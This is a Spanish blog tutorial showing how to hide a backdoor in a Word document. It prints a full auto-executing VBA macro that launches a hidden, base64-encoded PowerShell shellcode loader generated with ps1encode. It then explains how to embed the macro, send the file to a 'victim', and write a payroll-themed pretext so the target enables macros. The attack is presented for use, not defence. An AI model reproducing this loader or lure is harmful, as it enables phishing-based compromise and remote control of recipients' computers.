---
layout: single
title:  Como esconder un backdoor en un documento
excerpt: "En este post te explico un metodo de intrusion, que consiste en esconder un backdoor en un documento"
date: 2021-08-20
classes: wide
header:
    teaser: /assets/images/esconder-backdoor-en-documento/banner-backdoor-intrusion.png
    teaser_home_page: true
categories:
    - Intrusion
tags:
    - Tutoriales
    - Backdoor
    - Ataques
    - hacking
---

<p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/man_in_doorway_newblog.png" width="50%">
</p>

En este post vamos a tratar un sencillo metodo de intrusión el cual consiste en esconde un backdoor en un documento, como puede ser word, pdf,...etc.

Primero vamos a necesitar una herramienta externa desde los repositorios de github, la cual es ps1encode: **https://github.com/CroweCybersecurity/ps1encode**.

```
git clone https://github.com/CroweCybersecurity/ps1encode.git
```

<p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/img1.png" width="100%">
</p>

Al ejecutarlo vemos que nos muestra el modo de uso, el cual es bien sencillo, solo tenemos que pasarle los parametros necesarios, y como trabajamos con una conexión TCP debemos de pasarle el puerto y la IP origen.

> NOTA: si quieres trabajar fuera de red local acuerdate de que tienes que abrir un puerto para tu ip pública

En mi caso será dentro de red local por lo que no será necesario que abra ningún puerto. La configuración quedaría tal que así:

<p align="center">
<img src="/assets/images/esconder-backdoor-en-documento/img2.png" width="100%">
</p>

Vemos que en la opción **-t** usaremos el encode de **vba**, en otra palabras visual basic for application, que como ya sabemos es el lenguaje de macros de microsoft que se usa para programar aplicaciones windows. En cuanto presionemos enter nos saldrá un rollo como este:

```
Sub Auto_Open()

stringA = "power"
stringB = "shell.exe -NoE -NoP -NonI -W Hidden -E "
            
string0="JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAH"
string1="MAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBj"
string2="ACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALA"
string3="AgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMA"
string4="dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG"
string5="4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAcwBjACAAPQAgADsAJABzAGkAegBlACAAPQAgADAAeAAxADAAMAAwADsAaQBm"
string6="ACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwAHgAMQAwADAAMAApAHsAJABzAGkAegBlACAAPQAgACQAcwBjAC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAHMAaQB6AGUALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMA"
string7="A7ACQAaQAgAC0AbABlACAAKAAkAHMAYwAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAHcAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJAB4AC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJABzAGMAWwAkAGkAXQAsACAAMQApAH0AOwAkAHcAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUA"
string8="YQBkACgAMAAsADAALAAkAHgALAAwACwAMAAsADAAKQA7AGYAbwByACAAKAA7ADsAKQB7AFMAdABhAHIAdAAtAHMAbABlAGUAcAAgADYAMAB9ADsAJwA7ACQAZwBxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC"
string9="4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAaQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA4ACkAewAkAHgAOAA2ACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABX"
string10="AGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABjAG0AZAAgAD0AIAAiAC0AbgBvAHAAIAAtAG4AbwBuAGkAIAAtAGUAbgBjACAAIgA7AGkAZQB4ACAAIgAmACAAJAB4ADgANgAgACQAYwBtAGQAIAAkAGcAcQAiAH0AZQBsAHMAZQB7ACQAYwBtAGQAIAA9ACAAIg"
string11="AtAG4AbwBwACAALQBuAG8AbgBpACAALQBlAG4AYwAiADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABjAG0AZAAgACQAZwBxACIAOwB9AA=="

stringFinal=stringA+stringB+string0+string1+string2+string3+string4+string5+string6+string7+string8+string9+string10+string11

    Shell stringFinal, 0
End Sub

Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub

```

El cual tenemos que copiar explicitamente. 

Bien ahora tendremos que abrir un documento word, en el cual vamos a tener que habilitar la herramienta de desarrollador, nos dirigimos a **archivo > opciones > personalizar cinta de opciones** y seleccionamos desarrollador para que sea visible.

Una vez que ya hemos realizado el paso anterior pinchamos en desarrollador, nos vamos a visual basic(se encuantra en la barra de herramientas superior) y pinchamos en "this document" y se nos abrirá una ventana nueva. Esta ventana tiene dos apartados, en el primero de ellos por defecto estará en general, tenemos que cambiarlo a document, y luego cambiaremos, a su derecha, la opcion a "open".

Ahora es importante eliminar todo lo que por defecto se haya escrito en la parte de debajo, borramos y pegamos lo que nos generó el ps1encode.

Bueno pues echo esto ya puedes cerrar la ventana de visual basic, de vuelta en el documento word escribe lo que queiras, un proyecto, un trabajo etc...
Cuando termines es importante que lo guardes con extensión .doc, ya que esta corresponde a word 97-2003.

Ya solo resta enviarlo a la víctima. Un pequeño detalle la víctima verá lo que haya en el word como si fuera un archivo corriente, pero leugo se le abrirá arriba un diálogo amarillo con lo siguiente **"Haz click en habilitar macros para ver el contenido"** con el boton correspondiente alado, aqui es donde entran tus dotes de ethical hacking ya que tendras que hacer que el emnsaje que hayas escrito en el word concuerde para qu eneustra víctima no sospeche cuando le salga el mensaje, una ejemplo en empresa podría ser el siguiente:

**"Buenas tardes, aqui les adjunto los informes correspondientes a las nóminas de la semana pasada"**

Viendo este mensaje más el que le sale mencionado anteriormente la víctima creera que tendrá que activar dicha opción para visualizar el contenido, ya esto queda a vuestra manera el como hacerlo.